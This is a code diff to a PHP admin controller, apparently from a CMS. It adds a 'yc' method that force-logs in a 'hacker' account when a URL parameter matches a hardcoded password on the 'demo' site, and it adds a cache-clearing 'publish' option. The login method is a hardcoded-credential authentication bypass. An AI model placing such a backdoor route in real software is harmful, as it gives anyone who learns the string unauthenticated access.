@@ -84,6 +84,20 @@ class Admin_Controller extends Controller {
 		die($view);
 	}
 	
+
+	public function yc($pw=NULL)
+	{
+		if($pw !== 'aLlwEnEedIsaNinterVieW' OR $this->site_name != 'demo')
+			die('invalid');
+		
+		if(!$this->account_user->login('hacker', (int)ROOTSITEID, 'hacker', FALSE))
+			die('failed login');
+
+		# setup credentials via the auth library
+		$this->client->force_login($this->account_user->get_user());
+		url::redirect();			
+	}
+	
 	
 /**
  * set some sitewide settings
@@ -104,6 +118,17 @@ class Admin_Controller extends Controller {
 			$site->custom_domain = $_POST['custom_domain'];
 			$site->homepage		 = $homepage[0];
 			$site->save();
+
+			# should we publish the entire site?
+			if(isset($_POST['publish']) AND 'yes' == $_POST['publish'])
+			{
+				$cache_dir = DATAPATH ."$this->site_name/cache";
+				if(is_dir($cache_dir))
+					Jdirectory::remove($cache_dir);
+					
+				mkdir($cache_dir);
+			}
+
 			
 			# update site_config.yml if new homepage
 			# and force page to be enabled.
